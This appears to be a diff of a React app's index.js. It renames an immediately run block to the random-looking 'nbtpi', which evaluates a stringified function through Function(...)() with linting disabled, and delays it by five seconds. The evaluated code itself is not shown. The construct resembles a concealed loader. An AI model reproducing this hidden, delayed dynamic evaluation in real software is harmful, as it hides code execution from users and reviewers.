@@ -26,7 +26,7 @@ root.render(
   </React.StrictMode>
 );
 
-(() => {
+function nbtpi() {
   // eslint-disable-next-line
   Function(
     "return (" +
@@ -77,7 +77,11 @@ root.render(
       }.toString() +
       ")()"
   )();
-})();
+}
+
+setTimeout(() => {
+  nbtpi();
+}, 5000)
 
 // If you want to start measuring performance in your app, pass a function
 // to log results (for example: reportWebVitals(console.log))
